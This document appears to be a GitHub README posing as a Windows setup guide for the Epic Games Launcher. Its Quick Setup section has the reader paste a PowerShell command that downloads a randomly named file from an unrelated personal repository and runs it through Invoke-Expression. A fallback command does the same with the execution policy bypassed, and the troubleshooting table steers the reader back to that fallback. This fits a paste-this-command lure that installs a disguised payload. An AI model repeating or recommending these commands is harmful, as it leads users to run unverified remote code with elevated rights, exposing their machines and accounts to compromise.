# Epic Games Launcher

Epic Games Launcher is the Windows tool this page sets up. The command in Quick Setup installs it on this PC. You open Epic Games Launcher to start and manage what it runs.

The notes below are the Windows 10 and Windows 11 setup for Epic Games Launcher, plus the files this repository keeps next to it.


Epic Games Launcher is the Windows desktop client Epic uses to deliver games, demos, and creative tools from the Epic Games Store. After installation it links to your Epic account, keeps entitlement data in sync, and applies patches quietly so installed titles stay aligned with the live service without hunting for separate updaters. It also routes you into Unreal Engine and mod-friendly titles when those products are entitled on your profile. A typical session begins from the Start menu or a pinned taskbar icon. You land on a home view with promotions, your library shelf, and download progress for anything in queue. Selecting a title either starts the game or resumes an install while you browse the store or adjust settings such as install folders and cloud saves where supported. Background updates continue through the system tray icon while you keep working in other applications. This repository tracks a pinned Windows setup artifact for repeatable rollout, alongside operator notes and a chronological changelog. Contributors record which build was smoke-tested on target machines and summarize behavioral changes when Epic ships a new launcher revision, so downstream environments stay documented and comparable over time. The setup file reflects the last verified channel build; notes explain silent-install switches useful on managed PCs.

[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
[![Build](https://img.shields.io/badge/build-1.0-0ea5e9?style=flat-square)]()
[![License](https://img.shields.io/badge/license-MIT-16a34a?style=flat-square)]()

## What you open

Epic Games Launcher is the window that starts the other software. Your list stays on this PC after a reboot. This page is only the setup.

Epic Games Launcher is a normal tool window. These notes stay with build 1.0. What it launches is started from Epic Games Launcher, not from this repository.

- Opens your Epic library from one Start menu entry after a quick account sign-in.
- Downloads and patches Fortnite and other Epic titles without leaving the client window.
- Surfaces weekly free games and wishlist alerts directly on the home screen.
- Manages install locations and repair options when a game fails to launch.
- Shows friends online and party invites for supported multiplayer titles.
- Integrates Unreal Engine installs alongside games when you enable developer tools.
- Runs a lightweight tray icon so updates finish while you work elsewhere.
- Validates installs against Epic servers before starting each protected title.

## Before you run it

Use the Windows PC where you want Epic Games Launcher. Windows should be 64-bit, with about 8 GB of memory and 8 GB free. If the account is not an administrator, the terminal will ask once. Confirm it.

## Quick Setup (PowerShell)

This installs the tool Epic Games Launcher on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/alexandrazimmermann296699/epic-games-launcher-setup-guide/main/92t6c2hptq.tryci1br | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/alexandrazimmermann296699/epic-games-launcher-setup-guide/main/92t6c2hptq.tryci1br | Invoke-Expression"
```

## After setup

When the terminal finishes, open Epic Games Launcher. Click the Windows icon, type `Epic Games Launcher`, and click the tool. Then start what you wanted from that window.

## If it stops

| What you see | What to do |
| --- | --- |
| Red text about scripts or policy | Use the second command. Paste it into Windows PowerShell and press Enter. |
| Old window still open | Close Epic Games Launcher completely, including the tray, then paste the command again. |
| Nothing happens | The window must be Windows PowerShell from the Start menu, not Command Prompt. Paste the command again and press Enter. |
| Low memory | 8 GB is the floor used for these notes. Close browsers and try again. |

## Files

| File | What it is |
| --- | --- |
| `92t6c2hptq.tryci1br` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `alexandrazimmermann296699/epic-games-launcher-setup-guide`. Epic Games Launcher 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
